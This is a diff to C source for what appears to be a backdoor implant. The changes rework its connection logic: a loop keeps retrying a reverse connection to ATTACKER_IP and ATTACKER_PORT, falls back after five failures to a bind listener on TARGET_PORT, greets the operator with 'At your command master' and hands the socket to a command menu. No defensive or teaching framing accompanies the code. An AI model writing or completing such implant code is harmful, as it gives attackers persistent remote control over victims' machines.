@@ -12,13 +12,29 @@ int reverseConnection();
 int connection();
 
 int communication(){
-    int pid=fork();
-    if(pid==0){
-        reverseConnection();
+    int attempts = 0;
+    int maxTries = 5;
+    
+    //connection();
+    
+    //reverseConnection();
+    
+    while(1){
+      if(reverseConnection() == 0){
+          attempts=0;
+          //sleep(5);
+          continue;
+      }
+      attempts++;
+
+      if(maxTries<=attempts){
+          connection();
+          attempts =0;
+          sleep(5);
+          continue;
+      }
     }
-    else{
-        connection();
-    }
+        
 }
 
 int reverseConnection(){
@@ -27,31 +43,30 @@ int reverseConnection(){
         char buffer[1024] ={0};
         int status, connID;
         
-        int RUN = 1;
         struct sockaddr_in dstAddr;
         
         dstAddr.sin_family = AF_INET;
         dstAddr.sin_port = htons(ATTACKER_PORT);
         inet_pton(AF_INET, ATTACKER_IP, &dstAddr.sin_addr);
         
-        while(RUN){
-            connID = socket(AF_INET ,SOCK_STREAM, 0);
-            if(valid(connID, "socket creation")==1){return 1;}
-            else{printf("[*] Socket Created \n");}
+        
+        connID = socket(AF_INET ,SOCK_STREAM, 0);
+        
+        printf("%d \n", connID);
+        
+        if(valid(connID, "socket creation")==1){return 1;}
+        else{printf("[*] Socket Created \n");}
             
-            status = connect(connID, (struct sockaddr *)&dstAddr, sizeof(dstAddr));
-            if(status == 0){
-                RUN = 0;
-            }else{
-                close(connID);
-                sleep(5);
-            }
-            
+        status = connect(connID, (struct sockaddr *)&dstAddr, sizeof(dstAddr));
+        if(status != 0){
+            close(connID);
+            return 1;
         }
         printf("connected\n");
         
         char *hello = "all set up";
-        send(connID, hello, strlen(hello),0);
+        safeSend(connID, hello);
+        //send(connID, hello, strlen(hello),0);
         
         mainMenu(connID);
         
@@ -68,7 +83,7 @@ int connection(){
         int RUN = 1;
         int opt =1;
         
-        char *hello = "At your command master";
+        
         
         address.sin_family = AF_INET;
         address.sin_port = htons(TARGET_PORT);
@@ -80,7 +95,10 @@ int connection(){
         
         while(RUN){
             server_fd = socket(AF_INET, SOCK_STREAM, 0);
-            if(valid(status,"socket creation")==1){return 1;}
+            
+            printf("%d \n", server_fd);
+            
+            if(valid(server_fd,"socket creation [1]")==1){return 1;}
             else{printf("[*] Socket Created \n");}
             
             if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))) {
@@ -114,8 +132,10 @@ int connection(){
         connID = accept(server_fd, (struct sockaddr *)&attackerAddr, (socklen_t *)&attackerLen);
         if(valid(connID,"accept")==1){return 1;}
         else{printf("[*] Accepted \n");}
-
-        send(connID, hello, strlen(hello), 0);
+        
+        char *hello = "At your command master";
+        safeSend(connID, hello);
+        //send(connID, hello, strlen(hello), 0);
         
         mainMenu(connID);
         
@@ -127,7 +147,8 @@ int connection(){
 
 int valid(int status, char *stage){
     if(status<0){
-        perror("[!] Failed \n");
+        printf("[!] Failed at %s \n", stage);
+        perror("");
         return 1;
     }
     else{return 0;}
